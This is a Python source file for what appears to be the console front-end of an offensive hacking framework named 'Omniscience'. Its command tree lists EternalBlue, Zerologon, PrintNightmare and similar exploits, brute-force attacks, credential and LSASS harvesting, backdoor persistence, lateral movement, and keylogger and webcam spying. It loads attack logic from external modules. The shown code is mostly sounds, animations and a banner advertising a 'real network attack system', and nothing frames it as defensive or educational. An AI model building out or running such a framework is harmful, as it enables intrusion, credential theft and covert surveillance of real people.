"""
OMNISCIENCE MASTER ORCHESTRATOR (v6.0)
High-Technology Command & Control Center
Ultra Advanced Tree-Based Command System
"""

import os
import sys
import time
import json
import socket
import random
import logging
import threading
import subprocess
import re  # added missing import for regex in s3-scan
from datetime import datetime
from colorama import Fore, Back, Style, init
import ipaddress
try:
    import netifaces
except ImportError:
    try:
        import netifaces2 as netifaces
    except ImportError:
        print("ERROR: Please install netifaces: pip install netifaces2")
        import sys
        sys.exit(1)

# Import advanced UI components
try:
    from advanced_ui import LiveMonitor, AdvancedVisualEffects, CommandTree
    ADVANCED_UI_AVAILABLE = True
except ImportError:
    ADVANCED_UI_AVAILABLE = False
    print("Warning: Advanced UI not available. Creating fallback...")
    class LiveMonitor:
        def __init__(self): pass
        def start_live_monitor(self): pass
        def add_activity(self, msg, level='info'): pass
        def increment_stat(self, key, amount=1): pass
    class AdvancedVisualEffects:
        @staticmethod
        def typewriter_effect(text, delay=0.03, color=Fore.GREEN): print(text)
        @staticmethod
        def scanning_animation(text, duration=2.0): print(f"[*] {text}")
        @staticmethod
        def target_lock_animation(ip): print(f"[*] Target: {ip}")
        @staticmethod
        def exploit_animation(name, target): print(f"[*] Exploiting {target} with {name}")
    class CommandTree:
        def __init__(self): self.commands = {}
        def print_tree(self): pass

# Force UTF-8 encoding for Windows console
if sys.platform == 'win32':
    import ctypes
    kernel32 = ctypes.windll.kernel32
    kernel32.SetConsoleOutputCP(65001)
    kernel32.SetConsoleCP(65001)
    sys.stdout.reconfigure(encoding='utf-8')
    sys.stderr.reconfigure(encoding='utf-8')
import winsound
import msvcrt

# Initialize Colorama
init(autoreset=True)

# ULTRA MAX HACKER TERMINAL CONFIGURATION
os.system('color 0A')
os.system('title OMNISCIENCE HACKER MODE v6.0 - ULTIMATE POWER')
import ctypes
kernel32 = ctypes.WinDLL('kernel32')
handle = kernel32.GetStdHandle(-11)
ctypes.windll.kernel32.SetConsoleTextAttribute(handle, 0x0A)

# MAXIMIZE CONSOLE WINDOW
hwnd = ctypes.windll.kernel32.GetConsoleWindow()
user32 = ctypes.WinDLL('user32')
user32.ShowWindow(hwnd, 3)  # SW_MAXIMIZE

# TREE COMMAND SYSTEM - Ultra Advanced Hierarchical Commands
TREE_COMMANDS = {
    "scan": {
        "_desc": "Network scanning operations",
        "auto": {"_desc": "Automatic full network discovery", "_full": "scan auto"},
        "fast": {"_desc": "Quick 10-second sweep", "_full": "scan fast"},
        "deep": {"_desc": "Deep reconnaissance scan", "_full": "scan deep"},
        "arp": {"_desc": "ARP-based discovery", "_full": "scan arp"},
        "icmp": {"_desc": "ICMP ping sweep", "_full": "scan icmp"},
        "netbios": {"_desc": "NetBIOS enumeration", "_full": "scan netbios"},
        "snmp": {"_desc": "SNMP sweep", "_full": "scan snmp"},
        "mdns": {"_desc": "mDNS discovery", "_full": "scan mdns"},
        "ssdp": {"_desc": "SSDP/UPnP discovery", "_full": "scan ssdp"},
        "port": {"_desc": "Port scan", "_full": "scan port", "_args": "<ip> <ports>"},
        "range": {"_desc": "Scan IP range", "_full": "scan range", "_args": "<CIDR>"},
        "cloud": {"_desc": "Cloud provider scan", "_full": "scan cloud", "_args": "<provider>"},
    },
    "exploit": {
        "_desc": "Exploitation framework",
        "auto": {"_desc": "Auto-exploit target", "_full": "exploit auto", "_args": "<ip>"},
        "smb": {"_desc": "SMB exploits", "_sub": {
            "ghost": {"_desc": "SMBGhost (CVE-2020-0796)", "_full": "exploit smb ghost", "_args": "<ip>"},
            "blue": {"_desc": "EternalBlue (MS17-010)", "_full": "exploit smb blue", "_args": "<ip>"},
            "vulns": {"_desc": "Full SMB vuln scan", "_full": "exploit smb vulns", "_args": "<ip>"},
        }},
        "rdp": {"_desc": "RDP exploits", "_sub": {
            "bluekeep": {"_desc": "BlueKeep check", "_full": "exploit rdp bluekeep", "_args": "<ip>"},
            "brute": {"_desc": "RDP brute force", "_full": "exploit rdp brute", "_args": "<ip>"},
        }},
        "print": {"_desc": "Print spooler exploits", "_sub": {
            "nightmare": {"_desc": "PrintNightmare", "_full": "exploit print nightmare", "_args": "<ip>"},
            "spooler": {"_desc": "Spooler check", "_full": "exploit print spooler", "_args": "<ip>"},
        }},
        "ntlm": {"_desc": "NTLM coercion", "_sub": {
            "petitpotam": {"_desc": "PetitPotam", "_full": "exploit ntlm petitpotam", "_args": "<ip>"},
            "zerologon": {"_desc": "Zerologon", "_full": "exploit ntlm zerologon", "_args": "<ip> <dc>"},
            "nopac": {"_desc": "NoPac", "_full": "exploit ntlm nopac", "_args": "<ip>"},
        }},
        "ssh": {"_desc": "SSH exploits", "_sub": {
            "brute": {"_desc": "SSH brute force", "_full": "exploit ssh brute", "_args": "<ip>"},
            "exec": {"_desc": "SSH command exec", "_full": "exploit ssh exec", "_args": "<ip> <cmd>"},
        }},
        "web": {"_desc": "Web exploits", "_sub": {
            "tomcat": {"_desc": "Tomcat brute", "_full": "exploit web tomcat", "_args": "<ip>"},
            "jenkins": {"_desc": "Jenkins exec", "_full": "exploit web jenkins", "_args": "<ip>"},
        }},
    },
    "control": {
        "_desc": "Remote control operations",
        "exec": {"_desc": "Execute command", "_full": "control exec", "_args": "<cmd>"},
        "shell": {"_desc": "Interactive shell", "_full": "control shell"},
        "powershell": {"_desc": "PowerShell session", "_full": "control powershell", "_args": "<script>"},
        "upload": {"_desc": "Upload file", "_full": "control upload", "_args": "<local> [remote]"},
        "download": {"_desc": "Download file", "_full": "control download", "_args": "<remote> [local]"},
    },
    "gather": {
        "_desc": "Data exfiltration",
        "all": {"_desc": "Extract everything", "_full": "gather all"},
        "creds": {"_desc": "Harvest credentials", "_full": "gather creds"},
        "wifi": {"_desc": "WiFi passwords", "_full": "gather wifi"},
        "browser": {"_desc": "Browser data", "_full": "gather browser"},
        "tokens": {"_desc": "Auth tokens", "_full": "gather tokens"},
        "hashes": {"_desc": "Password hashes", "_full": "gather hashes"},
        "lsass": {"_desc": "LSASS dump", "_full": "gather lsass"},
        "vault": {"_desc": "Credential vault", "_full": "gather vault"},
    },
    "persistence": {
        "_desc": "Backdoor installation",
        "auto": {"_desc": "Auto-install backdoors", "_full": "persistence auto"},
        "service": {"_desc": "Create service", "_full": "persistence service", "_args": "<name> <path>"},
        "registry": {"_desc": "Registry run key", "_full": "persistence registry", "_args": "<name> <path>"},
        "scheduled": {"_desc": "Scheduled task", "_full": "persistence scheduled", "_args": "<name> <path>"},
        "wmi": {"_desc": "WMI event subscription", "_full": "persistence wmi", "_args": "<name> <script>"},
    },
    "lateral": {
        "_desc": "Lateral movement",
        "scan": {"_desc": "Find reachable targets", "_full": "lateral scan"},
        "psexec": {"_desc": "PSExec-style move", "_full": "lateral psexec", "_args": "<target>"},
        "winrm": {"_desc": "WinRM move", "_full": "lateral winrm", "_args": "<target>"},
        "wmi": {"_desc": "WMI move", "_full": "lateral wmi", "_args": "<target>"},
        "ssh": {"_desc": "SSH pivot", "_full": "lateral ssh", "_args": "<target>"},
    },
    "monitor": {
        "_desc": "Live monitoring",
        "screen": {"_desc": "Screen capture stream", "_full": "monitor screen"},
        "keys": {"_desc": "Keylogger", "_full": "monitor keys"},
        "clipboard": {"_desc": "Clipboard spy", "_full": "monitor clipboard"},
        "webcam": {"_desc": "Webcam spy", "_full": "monitor webcam"},
        "audio": {"_desc": "Audio capture", "_full": "monitor audio", "_args": "<seconds>"},
        "process": {"_desc": "Process monitor", "_full": "monitor process"},
    },
    "db": {
        "_desc": "Database operations",
        "mysql": {"_desc": "MySQL access", "_sub": {
            "scan": {"_desc": "Find MySQL", "_full": "db mysql scan"},
            "root": {"_desc": "Root brute", "_full": "db mysql root", "_args": "<ip>"},
            "dump": {"_desc": "Dump database", "_full": "db mysql dump", "_args": "<ip> <db>"},
        }},
        "postgres": {"_desc": "PostgreSQL access", "_sub": {
            "scan": {"_desc": "Find PostgreSQL", "_full": "db postgres scan"},
            "root": {"_desc": "Root brute", "_full": "db postgres root", "_args": "<ip>"},
            "dump": {"_desc": "Dump database", "_full": "db postgres dump", "_args": "<ip> <db>"},
        }},
        "mssql": {"_desc": "MSSQL access", "_sub": {
            "scan": {"_desc": "Find MSSQL", "_full": "db mssql scan"},
            "exec": {"_desc": "Execute query", "_full": "db mssql exec", "_args": "<ip> <query>"},
            "dump": {"_desc": "Dump database", "_full": "db mssql dump", "_args": "<ip> <db>"},
        }},
    },
    "cloud": {
        "_desc": "Cloud attacks",
        "aws": {"_desc": "AWS exploitation", "_sub": {
            "enum": {"_desc": "Enumerate resources", "_full": "cloud aws enum"},
            "s3": {"_desc": "S3 bucket scan", "_full": "cloud aws s3", "_args": "<bucket>"},
            "keys": {"_desc": "Key hunting", "_full": "cloud aws keys"},
        }},
        "azure": {"_desc": "Azure exploitation", "_sub": {
            "enum": {"_desc": "Enumerate resources", "_full": "cloud azure enum"},
            "token": {"_desc": "Token attacks", "_full": "cloud azure token"},
        }},
    },
    "show": {
        "_desc": "Display information",
        "targets": {"_desc": "Show discovered targets", "_full": "show targets"},
        "sessions": {"_desc": "Show active sessions", "_full": "show sessions"},
        "logs": {"_desc": "Show operation logs", "_full": "show logs"},
        "network": {"_desc": "Show network info", "_full": "show network"},
        "modules": {"_desc": "Show loaded modules", "_full": "show modules"},
    },
    "set": {
        "_desc": "Configuration",
        "target": {"_desc": "Set target IP", "_full": "set target", "_args": "<ip>"},
        "creds": {"_desc": "Set credentials", "_full": "set creds", "_args": "<user> <pass>"},
        "domain": {"_desc": "Set domain", "_full": "set domain", "_args": "<domain>"},
        "interface": {"_desc": "Set network interface", "_full": "set interface", "_args": "<id>"},
    },
}

# Build flat command lookup for validation
FLAT_COMMANDS = {}
def flatten_tree(tree, prefix=""):
    for cmd, data in tree.items():
        if cmd.startswith("_"):
            continue
        full_cmd = f"{prefix} {cmd}".strip() if prefix else cmd
        if "_sub" in data:
            flatten_tree(data["_sub"], full_cmd)
        elif "_full" in data:
            FLAT_COMMANDS[data["_full"]] = data
            FLAT_COMMANDS[full_cmd] = data
        else:
            FLAT_COMMANDS[full_cmd] = data

flatten_tree(TREE_COMMANDS)

def print_tree_help():
    """Print tree-style command help"""
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"\n{Fore.GREEN}{Style.BRIGHT}╔══════════════════════════════════════════════════════════════════════════════╗")
    print(f"{Fore.GREEN}{Style.BRIGHT}║                    OMNISCIENCE TREE COMMAND SYSTEM v6.0                      ║")
    print(f"{Fore.GREEN}{Style.BRIGHT}╚══════════════════════════════════════════════════════════════════════════════╝\n")
    
    def print_category(name, data, indent=0):
        prefix = "  " * indent
        desc = data.get("_desc", "")
        print(f"{Fore.LIGHTGREEN_EX}{Style.BRIGHT}{prefix}├─ {name}")
        print(f"{Fore.GREEN}{prefix}│   {desc}")
        
        if "_sub" in data:
            for subcmd, subdata in data["_sub"].items():
                print_category(subcmd, subdata, indent + 1)
        elif "_full" in data:
            full = data["_full"]
            args = data.get("_args", "")
            print(f"{Fore.CYAN}{prefix}│   └─ Usage: {full} {args}")
    
    for cat, data in TREE_COMMANDS.items():
        print_category(cat, data)
        print()
    
    print(f"{Fore.GREEN}{Style.BRIGHT}══════════════════════════════════════════════════════════════════════════════")
    print(f"{Fore.YELLOW}  Type 'help' for flat command list | Use TAB for auto-complete")
    print(f"{Fore.GREEN}{Style.BRIGHT}══════════════════════════════════════════════════════════════════════════════\n")

# Enhanced sound effects with more variety
class HackerSoundsEx:
    _enabled = True
    
    @staticmethod
    def beep(freq=800, dur=50):
        if not HackerSoundsEx._enabled:
            return
        try:
            def _beep():
                try:
                    winsound.Beep(freq, dur)
                except: pass
            t = threading.Thread(target=_beep, daemon=True)
            t.start()
        except: pass
    
    @staticmethod
    def play_sequence(freqs, dur=30, gap=0.03):
        for f in freqs:
            HackerSoundsEx.beep(f, dur)
            time.sleep(gap)
    
    @staticmethod
    def on_action():
        """Plays on every user action"""
        HackerSoundsEx.beep(600, 15)
    
    @staticmethod
    def on_success():
        """Plays on successful operation"""
        HackerSoundsEx.play_sequence([300, 500, 700, 900, 1200], 25, 0.03)
    
    @staticmethod
    def on_error():
        """Plays on error"""
        HackerSoundsEx.play_sequence([800, 600, 400, 200], 50, 0.05)
    
    @staticmethod
    def on_startup():
        """Plays on framework start"""
        HackerSoundsEx.play_sequence([200, 400, 600, 800, 1000, 1200, 1500], 40, 0.02)
    
    @staticmethod
    def on_scan():
        """Plays during scanning"""
        for _ in range(3):
            HackerSoundsEx.beep(400, 20)
            time.sleep(0.05)
            HackerSoundsEx.beep(600, 20)
            time.sleep(0.05)
    
    @staticmethod
    def on_exploit():
        """Plays during exploitation"""
        for i in range(8):
            HackerSoundsEx.beep(300 + i * 100, 15)
            time.sleep(0.02)
        HackerSoundsEx.beep(1500, 100)
    
    @staticmethod
    def on_access():
        """Plays on successful access"""
        HackerSoundsEx.play_sequence([500, 700, 900, 1100, 1300, 1600], 30, 0.02)
    
    @staticmethod
    def on_typing():
        """Subtle typing sound"""
        HackerSoundsEx.beep(random.randint(200, 500), random.randint(5, 15))
    
    @staticmethod
    def toggle():
        HackerSoundsEx._enabled = not HackerSoundsEx._enabled
        return HackerSoundsEx._enabled

# ULTRA MAX HACKER AUDIO ENGINE - FULLY FUNCTIONAL
class HackerSounds:
    _thread_pool = []
    _enabled = True
    _sound_queue = []
    _playing = False
    
    @staticmethod
    def beep_hack(freq=800, dur=50):
        if not HackerSounds._enabled:
            return
        try:
            def play():
                try:
                    winsound.Beep(int(freq), int(dur))
                except:
                    pass
            t = threading.Thread(target=play, daemon=True)
            t.start()
            HackerSounds._thread_pool.append(t)
            if len(HackerSounds._thread_pool) > 50:
                HackerSounds._thread_pool = HackerSounds._thread_pool[-25:]
        except: pass
    
    @staticmethod
    def matrix_rain_sound():
        def play_rain():
            for _ in range(random.randint(5,12)):
                f = random.randint(200, 1200)
                HackerSounds.beep_hack(f, random.randint(8,25))
                time.sleep(0.015)
        threading.Thread(target=play_rain, daemon=True).start()
    
    @staticmethod
    def scan_beep():
        def play_scan():
            freqs = [400, 500, 600, 700, 800, 900, 1000, 1100, 1200, 1300, 1200, 1100, 1000, 900, 800, 700]
            for f in freqs:
                HackerSounds.beep_hack(f, 20)
                time.sleep(0.025)
        threading.Thread(target=play_scan, daemon=True).start()
    
    @staticmethod
    def success():
        def play_success():
            sequence = [400, 600, 800, 1000, 1200, 1400, 1600, 1800, 2000]
            for f in sequence:
                HackerSounds.beep_hack(f, 35)
                time.sleep(0.04)
        threading.Thread(target=play_success, daemon=True).start()
    
    @staticmethod
    def alert():
        def play_alert():
            for i in range(7):
                HackerSounds.beep_hack(1400 + (i * 50), 80)
                time.sleep(0.08)
        threading.Thread(target=play_alert, daemon=True).start()
    
    @staticmethod
    def access_granted():
        def play_access():
            HackerSounds.beep_hack(700, 120)
            time.sleep(0.12)
            HackerSounds.beep_hack(1100, 120)
            time.sleep(0.08)
            HackerSounds.beep_hack(1500, 150)
            time.sleep(0.08)
            HackerSounds.beep_hack(1900, 400)
        threading.Thread(target=play_access, daemon=True).start()
    
    @staticmethod
    def exploit_success():
        def play_exploit():
            for i in range(15):
                f = 400 + (i * 100)
                HackerSounds.beep_hack(f, 18)
                time.sleep(0.02)
            HackerSounds.beep_hack(2200, 200)
            time.sleep(0.1)
            HackerSounds.beep_hack(2400, 150)
        threading.Thread(target=play_exploit, daemon=True).start()
    
    @staticmethod
    def typing():
        if random.random() < 0.3:  # 30% chance for typing sound
            f = random.randint(200, 900)
            HackerSounds.beep_hack(f, random.randint(10,20))
    
    @staticmethod
    def network_pulse():
        def play_pulse():
            HackerSounds.beep_hack(600, 15)
            time.sleep(0.015)
            HackerSounds.beep_hack(800, 15)
            time.sleep(0.015)
            HackerSounds.beep_hack(1000, 15)
        threading.Thread(target=play_pulse, daemon=True).start()
    
    @staticmethod
    def target_acquired():
        def play_target():
            HackerSounds.beep_hack(700, 60)
            time.sleep(0.06)
            HackerSounds.beep_hack(1000, 80)
            time.sleep(0.05)
            HackerSounds.beep_hack(1300, 120)
        threading.Thread(target=play_target, daemon=True).start()
    
    @staticmethod
    def connection_established():
        def play_connection():
            sequence = [500, 700, 900, 1100, 1300, 1500, 1700]
            for f in sequence:
                HackerSounds.beep_hack(f, 30)
                time.sleep(0.03)
        threading.Thread(target=play_connection, daemon=True).start()
    
    @staticmethod
    def command_error():
        def play_error():
            sequence = [1200, 1000, 800, 600, 400, 200]
            for f in sequence:
                HackerSounds.beep_hack(f, 50)
                time.sleep(0.06)
        threading.Thread(target=play_error, daemon=True).start()
    
    @staticmethod
    def command_success():
        def play_cmd_success():
            sequence = [400, 700, 1000, 1300, 1600, 1900]
            for f in sequence:
                HackerSounds.beep_hack(f, 35)
                time.sleep(0.04)
        threading.Thread(target=play_cmd_success, daemon=True).start()
    
    @staticmethod
    def command_exec():
        HackerSounds.beep_hack(random.randint(400, 900), 18)
    
    @staticmethod
    def invalid_command():
        def play_invalid():
            for _ in range(4):
                HackerSounds.beep_hack(250, 100)
                time.sleep(0.1)
        threading.Thread(target=play_invalid, daemon=True).start()
    
    @staticmethod
    def module_load_error():
        def play_module_error():
            HackerSounds.beep_hack(200, 250)
            time.sleep(0.12)
            HackerSounds.beep_hack(200, 250)
            time.sleep(0.1)
            for i in [500, 650, 800, 1000, 1200]:
                HackerSounds.beep_hack(i, 25)
                time.sleep(0.04)
        threading.Thread(target=play_module_error, daemon=True).start()
            
    @staticmethod
    def critical_error():
        def play_critical():
            for _ in range(6):
                HackerSounds.beep_hack(180, 350)
                time.sleep(0.18)
        threading.Thread(target=play_critical, daemon=True).start()
    
    @staticmethod
    def warning():
        def play_warning():
            sequence = [900, 700, 900, 700, 900]
            for f in sequence:
                HackerSounds.beep_hack(f, 40)
                time.sleep(0.06)
        threading.Thread(target=play_warning, daemon=True).start()
    
    @staticmethod
    def data_received():
        if random.random() < 0.4:  # 40% chance
            HackerSounds.beep_hack(random.randint(600, 1100), 12)
    
    @staticmethod
    def toggle_sound(state=None):
        if state is None:
            HackerSounds._enabled = not HackerSounds._enabled
        else:
            HackerSounds._enabled = state
        return HackerSounds._enabled
# ADVANCED GREEN MATRIX ANIMATION ENGINE
class MatrixEffects:
    @staticmethod
    def rain_line(duration=0.03):
        chars = "01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン"
        line = ""
        for _ in range(os.get_terminal_size().columns if sys.stdout.isatty() else 80):
            line += random.choice(chars)
        intensity = random.randint(30, 100)
        if intensity > 80:
            print(f"{Fore.LIGHTGREEN_EX}{Style.BRIGHT}{line}")
        elif intensity > 50:
            print(f"{Fore.GREEN}{line}")
        else:
            print(f"{Fore.LIGHTBLACK_EX}{line}")
        time.sleep(duration)
    
    @staticmethod
    def intro_cycle(cycles=12):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"{Fore.GREEN}{Style.BRIGHT}INITIALIZING OMNISCIENCE FRAMEWORK v5.1...")
        MatrixEffects.loading_animation("System Boot", 2.0)
        MatrixEffects.loading_animation("Loading Modules", 1.5)
        MatrixEffects.loading_animation("Matrix Engine", 1.0)
        MatrixEffects.loading_animation("Hacker Interface", 0.8)

        for i in range(cycles):
            print(f"\n" * random.randint(3,10))
            intensity_msg = ["CALCULATING...", "ANALYZING...", "PROCESSING...", "HACKING..."][i % 4]
            print(f"{Fore.LIGHTGREEN_EX}{Style.BRIGHT}{intensity_msg}")
            for _ in range(random.randint(8,25)):
                MatrixEffects.rain_line(0.008)
            HackerSounds.network_pulse()
            os.system('cls' if os.name == 'nt' else 'clear')

        # Final pulse sequence
        HackerSounds.access_granted()
        time.sleep(0.5)
        HackerSounds.exploit_success()
        time.sleep(0.3)

    @staticmethod
    def advanced_welcome():
        """Ultra advanced hacking welcome with multi-threaded animations."""
        import threading
        import time

        # Function for enhanced center matrix rain with more intensity and sounds
        def center_rain():
            width = os.get_terminal_size().columns
            height = os.get_terminal_size().lines
            chars = "01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲンABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()"
            for _ in range(800):  # More rain
                x = random.randint(0, width-1)
                y = random.randint(0, height-1)
                char = random.choice(chars)
                intensity = random.randint(20, 100)
                if intensity > 85:
                    color = Fore.LIGHTGREEN_EX
                elif intensity > 60:
                    color = Fore.GREEN
                elif intensity > 40:
                    color = Fore.YELLOW
                else:
                    color = Fore.LIGHTBLACK_EX
                print(f"\033[{y};{x}H{color}{char}", end="", flush=True)
                if random.random() < 0.15:  # Increased sound chance
                    HackerSounds.beep_hack(random.randint(200, 800), random.randint(3, 10))
                time.sleep(0.005)  # Faster rain

        # Function for giant rotating earth with continents in center (removed but kept as placeholder)
        # (The earth animation is not started, so no problem)

        # Function for network features on right side
        def network_panel():
            width = os.get_terminal_size().columns
            height = os.get_terminal_size().lines
            x = width - 30  # Right side
            y_start = 5
            networks = [
                "Scanning 192.168.1.0/24",
                "Found: 192.168.1.1 (GW)",
                "Found: 192.168.1.100 (PC)",
                "Vuln: EternalBlue",
                "Port 445 OPEN",
                "SMB Version: 3.0",
                "Exploiting...",
                "SUCCESS: Shell obtained"
            ]
            for i in range(len(networks) * 3):  # More cycles
                for j, net in enumerate(networks):
                    if i >= j:
                        status = "✓" if i > j else "⟳"
                        color = Fore.GREEN if i > j else Fore.YELLOW
                        print(f"\033[{y_start + j};{x}H{color}{status} {net}", end="", flush=True)
                # Enhanced sounds
                if i % 3 == 0:
                    HackerSounds.scan_beep()
                elif i % 3 == 1:
                    HackerSounds.beep_hack(random.randint(600, 1000), 15)
                else:
                    HackerSounds.network_pulse()
                time.sleep(0.15)  # Faster

        # Function for bottom matrix rain
        def bottom_rain():
            width = os.get_terminal_size().columns
            height = os.get_terminal_size().lines
            chars = "!@#$%^&*()[]{}|;:,.<>?/\\`~"
            for _ in range(400):
                x = random.randint(0, width-1)
                y = random.randint(height//2, height-1)  # Bottom half
                char = random.choice(chars)
                color = Fore.RED if random.random() < 0.5 else Fore.MAGENTA
                print(f"\033[{y};{x}H{color}{char}", end="", flush=True)
                if random.random() < 0.1:
                    HackerSounds.beep_hack(random.randint(1000, 1500), 8)
                time.sleep(0.008)

        # Function for middle hacking messages
        def middle_hack():
            width = os.get_terminal_size().columns
            height = os.get_terminal_size().lines
            messages = [
                "INITIALIZING HACKER MATRIX...",
                "LOADING EXPLOIT CHAINS...",
                "CONNECTING TO DARK WEB...",
                "BREACHING FIREWALLS...",
                "GAINING ROOT ACCESS...",
                "DOMINATING NETWORK...",
                "OMNISCIENCE ACTIVE!"
            ]
            for msg in messages:
                x = (width - len(msg)) // 2
                y = height // 2 + 2
                print(f"\033[{y};{x}H{Fore.RED}{Style.BRIGHT}{msg}", end="", flush=True)
                HackerSounds.alert()
                HackerSounds.beep_hack(random.randint(700, 1000), 20)
                if "ACTIVE" in msg:
                    HackerSounds.success()
                    HackerSounds.exploit_success()
                else:
                    HackerSounds.matrix_rain_sound()
                time.sleep(0.5)
                print(f"\033[{y};{x}H{' ' * len(msg)}", end="", flush=True)  # Clear

        # Start threads
        threads = []
        threads.append(threading.Thread(target=center_rain, daemon=True))
        # Removed rotating_earth to remove world earth from center
        threads.append(threading.Thread(target=network_panel, daemon=True))
        threads.append(threading.Thread(target=middle_hack, daemon=True))
        threads.append(threading.Thread(target=bottom_rain, daemon=True))
        # Add more moving codes with additional rain threads
        threads.append(threading.Thread(target=center_rain, daemon=True))
        threads.append(threading.Thread(target=center_rain, daemon=True))

        for t in threads:
            t.start()

        # Wait for enhanced animations
        time.sleep(8)

        # Clear screen
        os.system('cls' if os.name == 'nt' else 'clear')
    
    @staticmethod
    def loading_animation(text, duration=2.0):
        chars = "▁▂▃▄▅▆▇█▇▆▅▄▃▂▁"
        end = time.time() + duration
        i = 0
        while time.time() < end:
            frame = chars[i % len(chars)]
            print(f"\r  {Fore.GREEN}{frame} {Fore.LIGHTGREEN_EX}{text}...", end="", flush=True)
            i += 1
            time.sleep(0.05)
        print(f"\r  {Fore.GREEN}✔ {Fore.LIGHTGREEN_EX}{text} [COMPLETE]{Style.RESET_ALL}   ")
    
    @staticmethod
    def scanning_animation():
        blocks = "█▓▒░▪▫"
        while True:
            if random.random() < 0.7:
                c = random.choice(blocks)
                intensity = random.randint(30, 100)
                if intensity > 80:
                    sys.stdout.write(f"{Fore.LIGHTGREEN_EX}{c}")
                elif intensity > 50:
                    sys.stdout.write(f"{Fore.GREEN}{c}")
                else:
                    sys.stdout.write(f"{Fore.LIGHTBLACK_EX}{c}")
                sys.stdout.flush()
            time.sleep(0.005)
    
    @staticmethod
    def target_lock():
        for i in range(5):
            print(f"\r  {Fore.GREEN}🔓 {Fore.LIGHTGREEN_EX}TARGET ACQUISITION {'.'*(i%4)}", end="", flush=True)
            HackerSounds.beep_hack(600 + (i*100), 30)
            time.sleep(0.2)
        print(f"\r  {Fore.GREEN}🔒 {Fore.LIGHTGREEN_EX}TARGET LOCKED - READY FOR ENGAGEMENT{Style.RESET_ALL}")
        HackerSounds.target_acquired()

# Configuration
LOG_FILE = "omniscience.log"
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | [%(levelname)s] | OmniShell | %(message)s",
    handlers=[logging.FileHandler(LOG_FILE, mode="a")]
)
logger = logging.getLogger("Omniscience.OmniShell")

# Robust Module Loading Utility
_MODULE_MAP = {
    "1": "network_discovery",
    "2": "passive_intel",
    "3": "remote_control",
    "5": "advanced_scanner",
    "6": "lateral_movement",
    "7": "exploit_engine",
}

def get_module(name):
    try:
        import importlib.util
        filename = _MODULE_MAP.get(str(name), name)
        for candidate in [filename, name]:
            if os.path.exists(f"{candidate}.py"):
                spec = importlib.util.spec_from_file_location(f"mod_{candidate}", f"{candidate}.py")
                module = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(module)
                return module
    except Exception as e:
        logger.error(f"Failed to load module '{name}': {e}")
    return None

# Visualizer Class
class Visualizer:
    """Premium UI Utilities."""
    
    ASCII_CHARS = ['@', '#', 'S', '%', '?', '*', '+', ':', '.', ' ']

    # GREEN HACKER THEME ONLY
    _GRAD = [Fore.GREEN, Fore.LIGHTGREEN_EX, Fore.GREEN, Fore.LIGHTGREEN_EX, Fore.GREEN]

    @staticmethod
    def _sep(char="═", width=80, color=Fore.GREEN):
        return f"{color}{Style.BRIGHT}{char * width}"

    @staticmethod
    def banner():
        W = 100
        lines = [
            r"  ██████╗ ███╗   ███╗███╗   ██╗██╗███████╗ ██████╗██╗███████╗███╗   ██╗ ██████╗███████╗",
            r"  ██╔═══██╗████╗ ████║████╗  ██║██║██╔════╝██╔════╝██║██╔════╝████╗  ██║██╔════╝██╔════╝",
            r"  ██║   ██║██╔████╔██║██╔██╗ ██║██║███████╗██║     ██║█████╗  ██╔██╗ ██║██║     █████╗  ",
            r"  ██║   ██║██║╚██╔╝██║██║╚██╗██║██║╚════██║██║     ██║██╔══╝  ██║╚██╗██║██║     ██╔══╝  ",
            r"  ╚██████╔╝██║ ╚═╝ ██║██║ ╚████║██║███████╗╚██████╗██║███████╗██║ ╚████║╚██████╗███████╗",
            r"   ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝╚══════╝ ╚═════╝╚═╝╚══════╝╚═╝  ╚═══╝ ╚═════╝╚══════╝",
            r"",
            r"  ╔══════════════════════════════════════════════════════════════════════════════════════╗",
            r"  ║                        ULTRA ADVANCED HACKER COMMAND CENTER                        ║",
            r"  ║                    NETWORK DOMINATION │ EXPLOIT CHAINS │ TOTAL CONTROL             ║",
            r"  ╚══════════════════════════════════════════════════════════════════════════════════════╝",
        ]
        grad_colors = [Fore.GREEN, Fore.LIGHTGREEN_EX, Fore.GREEN, Fore.LIGHTGREEN_EX, Fore.GREEN, Fore.GREEN, Fore.WHITE, Fore.CYAN, Fore.CYAN, Fore.CYAN, Fore.WHITE]
        print()
        print(f"{Fore.GREEN}{Style.BRIGHT}{'╔' + '═'*98 + '╗'}")
        print(f"{Fore.GREEN}{Style.BRIGHT}║{' '*98}║")
        for i, line in enumerate(lines):
            color = grad_colors[i % len(grad_colors)]
            if line.strip():
                print(f"{Fore.GREEN}{Style.BRIGHT}║ {color}{Style.BRIGHT}{line}{Fore.GREEN} {' '*(98-len(line))}║")
            else:
                print(f"{Fore.GREEN}{Style.BRIGHT}║{' '*98}║")
        print(f"{Fore.GREEN}{Style.BRIGHT}║{' '*98}║")

        # System Info Section
        import platform
        system_info = [
            f"OS: {platform.system()} {platform.release()}",
            f"Python: {platform.python_version()}",
            f"Architecture: {platform.machine()}",
            f"Hostname: {socket.gethostname()}",
            f"IP: {socket.gethostbyname(socket.gethostname())}"
        ]

        for info in system_info:
            pad = (98 - len(info)) // 2
            print(f"{Fore.GREEN}{Style.BRIGHT}║{' '*pad}{Fore.LIGHTGREEN_EX}{Style.BRIGHT}{info}{Fore.GREEN}{' '*(98-pad-len(info))}║")

        tagline = "▸ HACKER MODE ACTIVE  ◂  REAL NETWORK ATTACK SYSTEM  ◂  VERSION 5.1  ◂  ULTRA MAX POWER"
        pad = (98 - len(tagline)) // 2
        print(f"{Fore.GREEN}{Style.BRIGHT}║{' '*pad}{Fore.LIGHTGREEN_EX}{Style.BRIGHT}{tagline}{Fore.GREEN}{' '*(98-pad-len(tagline))}║")
        print(f"{Fore.GREEN}{Style.BRIGHT}║{' '*98}║")

        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        info = f"[ SECURE SESSION: {now} │ FRAMEWORK READY │ ALL MODULES LOADED ]"
        pad2 = (98 - len(info)) // 2
        print(f"{Fore.GREEN}{Style.BRIGHT}║{' '*pad2}{Fore.LIGHTGREEN_EX}{Style.BRIGHT}{info}{Fore.GREEN}{' '*(98-pad2-len(info))}║")
